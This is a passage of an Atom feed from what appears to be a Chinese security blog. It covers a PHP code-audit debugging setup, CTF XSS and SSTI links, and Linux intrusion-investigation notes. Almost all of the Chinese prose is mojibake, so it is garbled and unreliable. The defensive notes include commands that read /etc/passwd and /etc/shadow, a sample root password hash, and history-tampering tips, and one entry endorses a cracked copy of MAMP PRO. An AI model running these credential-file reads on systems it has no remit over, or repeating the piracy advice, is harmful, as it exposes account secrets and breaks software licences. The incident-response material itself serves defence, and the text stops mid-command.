&lt;p&gt;&lt;a href=&quot;https://v0w.top/2020/08/26/CodeAudit-php/&quot;&gt;ä»£ç å®¡è®¡å¸¸è§çš„ä¸‰ç§æ–¹æ³•ï¼ˆPHPç¯‡ï¼‰&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sqlsec.co</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="æ¼æ´æŒ–æ˜" scheme="https://hack-for.fun/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>MacOS ä¸‹é…ç½®PHPä»£ç å®¡è®¡ç¯å¢ƒï¼ŒPHPè°ƒè¯•å­¦ä¹ </title>
    <link href="https://hack-for.fun/4fd81e40.html"/>
    <id>https://hack-for.fun/4fd81e40.html</id>
    <published>2020-09-11T12:34:13.000Z</published>
    <updated>2020-09-11T15:56:23.844Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ç¯å¢ƒé…ç½®å‚è€ƒæ–‡ç« ï¼š<a href="https://www.sqlsec.com/2020/07/macphp.html#toc-heading-2">https://www.sqlsec.com/2020/07/macphp.html#toc-heading-2</a></p><blockquote><p>æ‰€éœ€Appï¼š</p><p>MAMP PRO ï¼Œæˆ‘æ˜¯åœ¨Google é‡Œæ‰¾çš„Cracked Version</p><p>PHPStorm / Vscode</p></blockquote><p>MAMP ä¸­çš„ <code>php.ini</code> è®¾ç½®</p><p>åœ¨åˆ‡æ¢phpç‰ˆæœ¬æ—¶éœ€æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼Œå…å¾—debug ç¯å¢ƒå‡ºé”™ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_enable&#x3D;1</span><br><span class="line">xdebug.remote_host&#x3D;localhost</span><br><span class="line">xdebug.remote_port&#x3D;9000</span><br><span class="line">xdebug.remote_autostart&#x3D;1</span><br><span class="line">xdebug.profiler_enable&#x3D;0</span><br><span class="line">xdebug.profiler_output_dir&#x3D;&quot;&#x2F;Applications&#x2F;MAMP&#x2F;tmp&quot;</span><br><span class="line">xdebug.idekey&#x3D;&quot;my_key&quot;</span><br></pre></td></tr></table></figure><p>å‡ºç°ä¸‹å›¾çš„æƒ…å†µï¼Œè¯´æ˜Debug é…ç½®æ­£å¸¸ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911203443.png" alt="image-20200911203438853"></p><hr><blockquote><p>æ¨èå°†æ•´ä¸ªä»£ç å®¡è®¡çš„è·¯å¾„è®¾ç½®æˆProject, æ¯”å¦‚:  xxx/www/xxx</p><p>ç„¶åMAMP å’Œ PhpStorm çš„è®¾ç½®è¦ä¸€è‡´ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222248.png" alt="image-20200911204652392"></p><h1 id="å•ä¸ªæ–‡ä»¶è°ƒè¯•"><a href="#å•ä¸ªæ–‡ä»¶è°ƒè¯•" class="headerlink" title="å•ä¸ªæ–‡ä»¶è°ƒè¯•"></a>å•ä¸ªæ–‡ä»¶è°ƒè¯•</h1><p>æµ‹è¯•Debug æ˜¯å¦æˆåŠŸï¼šåœ¨ç¬¬å››è¡Œï¼Œå˜é‡å­—ç¬¦ä¸²æ‹¼æ¥çš„åœ°æ–¹ï¼Œä¸‹ä¸ªæ–­ç‚¹è¿›è¡Œè°ƒè¯•ã€‚ç»“æœå¦‚å›¾ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222425.png" alt="image-20200911205830698"></p><h1 id="æ•´ä¸ªæ–‡ä»¶å¤¹-ç½‘ç«™ç›®å½•-è°ƒè¯•"><a href="#æ•´ä¸ªæ–‡ä»¶å¤¹-ç½‘ç«™ç›®å½•-è°ƒè¯•" class="headerlink" title="æ•´ä¸ªæ–‡ä»¶å¤¹(ç½‘ç«™ç›®å½•)è°ƒè¯•"></a>æ•´ä¸ªæ–‡ä»¶å¤¹(ç½‘ç«™ç›®å½•)è°ƒè¯•</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222559.png" alt="image-20200911210726371"></p><blockquote><p>å…³é”®æ˜¯é€‰æ‹©ä¸‹é¢çš„Server å³å¯ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222713.png" alt="image-20200911210857642"></p><p>PHPMyadmin éœ€è¦php  5.5+ , cms å®‰è£…æ—¶ï¼Œæ•°æ®åº“åœ¨phpmyadmin ä¸­åˆ›å»ºå³å¯ã€‚</p><p>è¿™é‡Œä»¥å›½å…‰å¸ˆå‚…æ–‡ç« çš„cmsï¼Œåå°è¯­è¨€è®¾ç½®GetShellï¼Œæ¥æµ‹è¯•ã€‚</p><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-36">https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-36</a></p><p>åœ¨ 149 è¡Œä¸‹æ–­ç‚¹è°ƒè¯•</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222146.png"></p><p>å¯ç›´æ¥åœ¨<code>$lang_text</code> ä¸­ä¿®æ”¹å€¼å³å¯è¿›è¡Œè°ƒè¯•ã€‚</p><p>Burp Suite æŠ“åŒ…çš„è¯·æ±‚åŒ…ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222725.png" alt="image-20200911220557034"></p><h1 id="æ–‡ä»¶ç›‘æ§"><a href="#æ–‡ä»¶ç›‘æ§" class="headerlink" title="æ–‡ä»¶ç›‘æ§"></a>æ–‡ä»¶ç›‘æ§</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222737.png" alt="image-20200911213334993"></p><h1 id="MySQL-ç›‘æ§"><a href="#MySQL-ç›‘æ§" class="headerlink" title="MySQL ç›‘æ§"></a>MySQL ç›‘æ§</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222752.png" alt="image-20200911214143396"></p><p>éœ€è¦ä¿®æ”¹<code>config.ini</code> ä¸­çš„æ•°æ®åº“ä¸ºä¹‹å‰cms åˆ›å»ºçš„æ•°æ®åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[dbconf]</span><br><span class="line">host&#x3D;localhost</span><br><span class="line">port&#x3D;8889</span><br><span class="line">user&#x3D;root</span><br><span class="line">password&#x3D;root</span><br><span class="line">db_name&#x3D;test</span><br><span class="line">charset&#x3D;utf8</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222811.png" alt="image-20200911214903921"></p><p>ä½¿ç”¨DataGrip è¿æ¥MySQL æ—¶çš„ç›‘æ§æ—¥å¿—</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911223609.png" alt="image-20200911215237610"></p><h2 id="DataGrip-è¿æ¥æ•°æ®åº“"><a href="#DataGrip-è¿æ¥æ•°æ®åº“" class="headerlink" title="DataGrip è¿æ¥æ•°æ®åº“"></a>DataGrip è¿æ¥æ•°æ®åº“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222823.png" alt="image-20200911215449398"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911223553.png" alt="image-20200911215526972"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911223540.png" alt="image-20200911215342544"></p><h1 id="VsCode-é…ç½®"><a href="#VsCode-é…ç½®" class="headerlink" title="VsCode é…ç½®"></a>VsCode é…ç½®</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911234844.png" alt="image-20200911234023142"></p><p>VScode å•æ­¥è°ƒè¯•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911235149.png" alt="image-20200911233946444"></p><p>ç»ˆäºä¼šè°ƒè¯•äº†~ </p><p>ä¸‹ä¸€æ­¥å°±æ˜¯å»å®Œæ•´ä»£ç å®¡è®¡ä¸€ä¸‹è¿™ä¸ªCMS~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h1&gt;&lt;p&gt;ç¯å¢ƒé…ç½®å‚è€ƒæ–‡ç« ï¼š&lt;a href=&quot;https://www.sqlsec.com/2020/07/</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>WAF Bypass å§¿åŠ¿æ€»ç»“</title>
    <link href="https://hack-for.fun/66043e4c.html"/>
    <id>https://hack-for.fun/66043e4c.html</id>
    <published>2020-09-11T05:39:04.000Z</published>
    <updated>2020-09-11T15:56:23.845Z</updated>
    
    
    
    
    
    <category term="æ¸—é€æµ‹è¯•" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CTF-XSS</title>
    <link href="https://hack-for.fun/fb2051a0.html"/>
    <id>https://hack-for.fun/fb2051a0.html</id>
    <published>2020-09-09T08:46:34.000Z</published>
    <updated>2020-09-11T15:56:23.841Z</updated>
    
    <content type="html"><![CDATA[<p>xssï¼š<a href="http://xssaq.com/wooyun/">http://xssaq.com/wooyun/</a></p><p>xss ç»ƒä¹ å¹³å°ï¼š<a href="http://xss-quiz.int21h.jp/">http://xss-quiz.int21h.jp/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;xssï¼š&lt;a href=&quot;http://xssaq.com/wooyun/&quot;&gt;http://xssaq.com/wooyun/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;xss ç»ƒä¹ å¹³å°ï¼š&lt;a href=&quot;http://xss-quiz.int21h.jp/&quot;&gt;http://xss-quiz.</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-SSTI</title>
    <link href="https://hack-for.fun/936f84c6.html"/>
    <id>https://hack-for.fun/936f84c6.html</id>
    <published>2020-09-07T08:41:29.000Z</published>
    <updated>2020-09-11T15:56:23.843Z</updated>
    
    
    
    
    
    <category term="SSTI" scheme="https://hack-for.fun/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>Windows æœåŠ¡å™¨åº”æ€¥å“åº”</title>
    <link href="https://hack-for.fun/54449ea6.html"/>
    <id>https://hack-for.fun/54449ea6.html</id>
    <published>2020-09-07T08:40:08.000Z</published>
    <updated>2020-09-11T15:56:23.847Z</updated>
    
    
    
    
    
    <category term="Linuxåº”æ€¥å“åº”" scheme="https://hack-for.fun/tags/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>Linux æœåŠ¡å™¨åº”æ€¥å“åº”</title>
    <link href="https://hack-for.fun/e312198e.html"/>
    <id>https://hack-for.fun/e312198e.html</id>
    <published>2020-09-04T15:32:31.000Z</published>
    <updated>2020-09-07T08:40:36.620Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å‰è¨€ï¼š2020å¹´æœŸé—´æœ‰å¹¸å‚åŠ äº†æŠ¤ç½‘ï¼Œå®¢æˆ·åœ¨æ¼”ä¹ é˜¶æ®µå‡ºç°äº†ä¸€æ¬¡åº”æ€¥äº‹ä»¶ï¼ŒWindowsçš„é‚®ä»¶æœåŠ¡å™¨å‡ºç°äº†ä¸€ä¸ªéšè—ç”¨æˆ·å¼‚åœ°ç™»å½•â€¦â€¦ å½“æ—¶å®¢æˆ·æœ‰ç‚¹æƒ…ç»ªï¼ŒåŠ ä¹‹æˆ‘ä»¬è¿™è¾¹ç¡®å®éƒ½æ˜¯æ“…é•¿æ¸—é€ã€æŒ–æ´çš„å¸ˆå‚…ä»¬ï¼Œæ‰€ä»¥åº”æ€¥çš„æ—¶å€™æ˜¾å¾—å¾ˆé™Œç”Ÿï¼Œæ‰‹å¿™è„šä¹±ï¼Œç”šè‡³å¯ä»¥è¯´å¾ˆä¸šä½™ã€‚äºæ˜¯æ‰“ç®—è®¤çœŸçš„æŒ‰ç…§ç½‘ä¸Šä¸€äº›å…³äºåº”æ€¥å“åº”çš„èµ„æ–™æ¥å¤ç°ä¸€ä¸‹ï¼Œç†Ÿæ‚‰ä¸€äº›åŸºæœ¬çš„ä¸œè¥¿ã€‚ç®—æ˜¯æŒæ¡ä¸€ä¸‹å¸¸è¯†å¥½äº†ã€‚</p></blockquote><blockquote><p>æ‰€æœ‰å‚è€ƒèµ„æ–™ä»…ç”¨äºå­¦ä¹ </p></blockquote><p>Version1: å‚è€ƒï¼šBypass å¸ˆå‚…çš„é¡¹ç›®ï¼š<a href="https://bypass007.github.io/Emergency-Response-Notes/">https://bypass007.github.io/Emergency-Response-Notes/</a></p><h1 id="Linux-å…¥ä¾µæ’æŸ¥"><a href="#Linux-å…¥ä¾µæ’æŸ¥" class="headerlink" title="Linux å…¥ä¾µæ’æŸ¥"></a>Linux å…¥ä¾µæ’æŸ¥</h1><h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>å½“ä¼ä¸šå‘ç”Ÿé»‘å®¢å…¥ä¾µã€ç³»ç»Ÿå´©æºƒæˆ–å…¶å®ƒå½±å“ä¸šåŠ¡æ­£å¸¸è¿è¡Œçš„å®‰å…¨äº‹ä»¶æ—¶ï¼Œæ€¥éœ€ç¬¬ä¸€æ—¶é—´è¿›è¡Œå¤„ç†ï¼Œä½¿ä¼ä¸šçš„ç½‘ç»œä¿¡æ¯ç³»ç»Ÿåœ¨æœ€çŸ­æ—¶é—´å†…æ¢å¤æ­£å¸¸å·¥ä½œï¼Œè¿›ä¸€æ­¥æŸ¥æ‰¾å…¥ä¾µæ¥æºï¼Œè¿˜åŸå…¥ä¾µäº‹æ•…è¿‡ç¨‹ï¼ŒåŒæ—¶ç»™å‡ºè§£å†³æ–¹æ¡ˆä¸é˜²èŒƒæªæ–½ï¼Œä¸ºä¼ä¸šæŒ½å›æˆ–å‡å°‘ç»æµæŸå¤±ã€‚</p><p>é’ˆå¯¹å¸¸è§çš„æ”»å‡»äº‹ä»¶ï¼Œç»“åˆå·¥ä½œä¸­åº”æ€¥å“åº”äº‹ä»¶åˆ†æå’Œè§£å†³çš„æ–¹æ³•ï¼Œæ€»ç»“äº†ä¸€äº›LinuxæœåŠ¡å™¨å…¥ä¾µæ’æŸ¥çš„æ€è·¯ã€‚</p><h3 id="0x01-å…¥ä¾µæ’æŸ¥æ€è·¯"><a href="#0x01-å…¥ä¾µæ’æŸ¥æ€è·¯" class="headerlink" title="0x01 å…¥ä¾µæ’æŸ¥æ€è·¯"></a>0x01 å…¥ä¾µæ’æŸ¥æ€è·¯</h3><h4 id="1-1-è´¦å·å®‰å…¨"><a href="#1-1-è´¦å·å®‰å…¨" class="headerlink" title="1.1 è´¦å·å®‰å…¨"></a>1.1 è´¦å·å®‰å…¨</h4><p><strong>åŸºæœ¬ä½¿ç”¨ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1ã€ç”¨æˆ·ä¿¡æ¯æ–‡ä»¶&#x2F;etc&#x2F;passwd</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">ç”¨æˆ·åï¼šå¯†ç ï¼šç”¨æˆ·IDï¼šç»„IDï¼šç”¨æˆ·è¯´æ˜ï¼šå®¶ç›®å½•ï¼šç™»é™†ä¹‹åshell</span><br><span class="line">æ³¨æ„ï¼šæ— å¯†ç åªå…è®¸æœ¬æœºç™»é™†ï¼Œè¿œç¨‹ä¸å…è®¸ç™»é™†</span><br><span class="line"></span><br><span class="line">2ã€å½±å­æ–‡ä»¶&#x2F;etc&#x2F;shadow</span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI&#x2F;:16809:0:99999:7:::</span><br><span class="line">ç”¨æˆ·åï¼šåŠ å¯†å¯†ç ï¼šå¯†ç æœ€åä¸€æ¬¡ä¿®æ”¹æ—¥æœŸï¼šä¸¤æ¬¡å¯†ç çš„ä¿®æ”¹æ—¶é—´é—´éš”ï¼šå¯†ç æœ‰æ•ˆæœŸï¼šå¯†ç ä¿®æ”¹åˆ°æœŸåˆ°çš„è­¦å‘Šå¤©æ•°ï¼šå¯†ç è¿‡æœŸä¹‹åçš„å®½é™å¤©æ•°ï¼šè´¦å·å¤±æ•ˆæ—¶é—´ï¼šä¿ç•™</span><br><span class="line">who     æŸ¥çœ‹å½“å‰ç™»å½•ç”¨æˆ·ï¼ˆttyæœ¬åœ°ç™»é™†  ptsè¿œç¨‹ç™»å½•ï¼‰</span><br><span class="line">w       æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼Œæƒ³çŸ¥é“æŸä¸€æ—¶åˆ»ç”¨æˆ·çš„è¡Œä¸º</span><br><span class="line">uptime  æŸ¥çœ‹ç™»é™†å¤šä¹…ã€å¤šå°‘ç”¨æˆ·ï¼Œè´Ÿè½½</span><br></pre></td></tr></table></figure><p><strong>å…¥ä¾µæ’æŸ¥ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1ã€æŸ¥è¯¢ç‰¹æƒç”¨æˆ·ç‰¹æƒç”¨æˆ·(uid ä¸º0)</span><br><span class="line">[root@localhost ~]# awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br><span class="line">2ã€æŸ¥è¯¢å¯ä»¥è¿œç¨‹ç™»å½•çš„å¸å·ä¿¡æ¯</span><br><span class="line">[root@localhost ~]# awk &#39;&#x2F;\$1|\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br><span class="line">3ã€é™¤rootå¸å·å¤–ï¼Œå…¶ä»–å¸å·æ˜¯å¦å­˜åœ¨sudoæƒé™ã€‚å¦‚éç®¡ç†éœ€è¦ï¼Œæ™®é€šå¸å·åº”åˆ é™¤sudoæƒé™</span><br><span class="line">[root@localhost ~]# more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot;</span><br><span class="line">4ã€ç¦ç”¨æˆ–åˆ é™¤å¤šä½™åŠå¯ç–‘çš„å¸å·</span><br><span class="line">    usermod -L user    ç¦ç”¨å¸å·ï¼Œå¸å·æ— æ³•ç™»å½•ï¼Œ&#x2F;etc&#x2F;shadowç¬¬äºŒæ ä¸º!å¼€å¤´</span><br><span class="line">    userdel user       åˆ é™¤userç”¨æˆ·</span><br><span class="line">    userdel -r user    å°†åˆ é™¤userç”¨æˆ·ï¼Œå¹¶ä¸”å°†&#x2F;homeç›®å½•ä¸‹çš„userç›®å½•ä¸€å¹¶åˆ é™¤</span><br></pre></td></tr></table></figure><h4 id="1-2-å†å²å‘½ä»¤"><a href="#1-2-å†å²å‘½ä»¤" class="headerlink" title="1.2 å†å²å‘½ä»¤"></a>1.2 å†å²å‘½ä»¤</h4><p><strong>åŸºæœ¬ä½¿ç”¨ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡.bash_historyæŸ¥çœ‹å¸å·æ‰§è¡Œè¿‡çš„ç³»ç»Ÿå‘½ä»¤</span><br><span class="line">1ã€rootçš„å†å²å‘½ä»¤</span><br><span class="line">histroy</span><br><span class="line">2ã€æ‰“å¼€&#x2F;homeå„å¸å·ç›®å½•ä¸‹çš„.bash_historyï¼ŒæŸ¥çœ‹æ™®é€šå¸å·çš„å†å²å‘½ä»¤</span><br><span class="line"></span><br><span class="line">ä¸ºå†å²çš„å‘½ä»¤å¢åŠ ç™»å½•çš„IPåœ°å€ã€æ‰§è¡Œå‘½ä»¤æ—¶é—´ç­‰ä¿¡æ¯ï¼š</span><br><span class="line">1ï¼‰ä¿å­˜1ä¸‡æ¡å‘½ä»¤</span><br><span class="line">sed -i &#39;s&#x2F;^HISTSIZE&#x3D;1000&#x2F;HISTSIZE&#x3D;10000&#x2F;g&#39; &#x2F;etc&#x2F;profile</span><br><span class="line">2ï¼‰åœ¨&#x2F;etc&#x2F;profileçš„æ–‡ä»¶å°¾éƒ¨æ·»åŠ å¦‚ä¸‹è¡Œæ•°é…ç½®ä¿¡æ¯ï¼š</span><br><span class="line">######jiagu history xianshi#########</span><br><span class="line">USER_IP&#x3D;&#96;who -u am i 2&gt;&#x2F;dev&#x2F;null | awk &#39;&#123;print $NF&#125;&#39; | sed -e &#39;s&#x2F;[()]&#x2F;&#x2F;g&#39;&#96;</span><br><span class="line">if [ &quot;$USER_IP&quot; &#x3D; &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP&#x3D;&#96;hostname&#96;</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT&#x3D;&quot;%F %T $USER_IP &#96;whoami&#96; &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND&#x3D;&quot;history -a&quot;</span><br><span class="line">######### jiagu history xianshi ##########</span><br><span class="line">3ï¼‰source &#x2F;etc&#x2F;profileè®©é…ç½®ç”Ÿæ•ˆ</span><br><span class="line"></span><br><span class="line">ç”Ÿæˆæ•ˆæœï¼š 1  2018-07-10 19:45:39 192.168.204.1 root source &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">3ã€å†å²æ“ä½œå‘½ä»¤çš„æ¸…é™¤ï¼šhistory -c</span><br><span class="line">ä½†æ­¤å‘½ä»¤å¹¶ä¸ä¼šæ¸…é™¤ä¿å­˜åœ¨æ–‡ä»¶ä¸­çš„è®°å½•ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨åˆ é™¤.bash_profileæ–‡ä»¶ä¸­çš„è®°å½•ã€‚</span><br></pre></td></tr></table></figure><p><strong>å…¥ä¾µæ’æŸ¥ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¿›å…¥ç”¨æˆ·ç›®å½•ä¸‹</span><br><span class="line">cat .bash_history &gt;&gt; history.txt</span><br></pre></td></tr></table></figure><h4 id="1-3-æ£€æŸ¥å¼‚å¸¸ç«¯å£"><a href="#1-3-æ£€æŸ¥å¼‚å¸¸ç«¯å£" class="headerlink" title="1.3 æ£€æŸ¥å¼‚å¸¸ç«¯å£"></a>1.3 æ£€æŸ¥å¼‚å¸¸ç«¯å£</h4><p>ä½¿ç”¨netstat ç½‘ç»œè¿æ¥å‘½ä»¤ï¼Œåˆ†æå¯ç–‘ç«¯å£ã€IPã€PID</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp|more</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹ä¸‹pidæ‰€å¯¹åº”çš„è¿›ç¨‹æ–‡ä»¶è·¯å¾„ï¼Œ</span><br><span class="line">è¿è¡Œls -l &#x2F;proc&#x2F;$PID&#x2F;exeæˆ–file &#x2F;proc&#x2F;$PID&#x2F;exeï¼ˆ$PID ä¸ºå¯¹åº”çš„pid å·ï¼‰</span><br></pre></td></tr></table></figure><h4 id="1-4-æ£€æŸ¥å¼‚å¸¸è¿›ç¨‹"><a href="#1-4-æ£€æŸ¥å¼‚å¸¸è¿›ç¨‹" class="headerlink" title="1.4 æ£€æŸ¥å¼‚å¸¸è¿›ç¨‹"></a>1.4 æ£€æŸ¥å¼‚å¸¸è¿›ç¨‹</h4><p>ä½¿ç”¨pså‘½ä»¤ï¼Œåˆ†æè¿›ç¨‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pid</span><br></pre></td></tr></table></figure><h4 id="1-5-æ£€æŸ¥å¼€æœºå¯åŠ¨é¡¹"><a href="#1-5-æ£€æŸ¥å¼€æœºå¯åŠ¨é¡¹" class="headerlink" title="1.5 æ£€æŸ¥å¼€æœºå¯åŠ¨é¡¹"></a>1.5 æ£€æŸ¥å¼€æœºå¯åŠ¨é¡¹</h4><p><strong>åŸºæœ¬ä½¿ç”¨ï¼š</strong></p><p>ç³»ç»Ÿè¿è¡Œçº§åˆ«ç¤ºæ„å›¾ï¼š</p><table><thead><tr><th align="center">è¿è¡Œçº§åˆ«</th><th align="center">å«ä¹‰</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">å…³æœº</td></tr><tr><td align="center">1</td><td align="center">å•ç”¨æˆ·æ¨¡å¼ï¼Œå¯ä»¥æƒ³è±¡ä¸ºwindowsçš„å®‰å…¨æ¨¡å¼ï¼Œä¸»è¦ç”¨äºç³»ç»Ÿä¿®å¤</td></tr><tr><td align="center">2</td><td align="center">ä¸å®Œå…¨çš„å‘½ä»¤è¡Œæ¨¡å¼ï¼Œä¸å«NFSæœåŠ¡</td></tr><tr><td align="center">3</td><td align="center">å®Œå…¨çš„å‘½ä»¤è¡Œæ¨¡å¼ï¼Œå°±æ˜¯æ ‡å‡†å­—ç¬¦ç•Œé¢</td></tr><tr><td align="center">4</td><td align="center">ç³»ç»Ÿä¿ç•™</td></tr><tr><td align="center">5</td><td align="center">å›¾å½¢æ¨¡å¼</td></tr><tr><td align="center">6</td><td align="center">é‡å¯åŠ¨</td></tr></tbody></table><p>æŸ¥çœ‹è¿è¡Œçº§åˆ«å‘½ä»¤ runlevel</p><p>ç³»ç»Ÿé»˜è®¤å…è®¸çº§åˆ«</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi  &#x2F;etc&#x2F;inittab</span><br><span class="line">id&#x3D;3ï¼šinitdefault  ç³»ç»Ÿå¼€æœºåç›´æ¥è¿›å…¥å“ªä¸ªè¿è¡Œçº§åˆ«</span><br></pre></td></tr></table></figure><p>å¼€æœºå¯åŠ¨é…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;rc.local</span><br><span class="line">&#x2F;etc&#x2F;rc.d&#x2F;rc[0~6].d</span><br></pre></td></tr></table></figure><p>ä¾‹å­:å½“æˆ‘ä»¬éœ€è¦å¼€æœºå¯åŠ¨è‡ªå·±çš„è„šæœ¬æ—¶ï¼Œåªéœ€è¦å°†å¯æ‰§è¡Œè„šæœ¬ä¸¢åœ¨/etc/init.dç›®å½•ä¸‹ï¼Œç„¶ååœ¨/etc/rc.d/rc*.dä¸­å»ºç«‹è½¯é“¾æ¥å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost ~]# ln -s &#x2F;etc&#x2F;init.d&#x2F;sshd 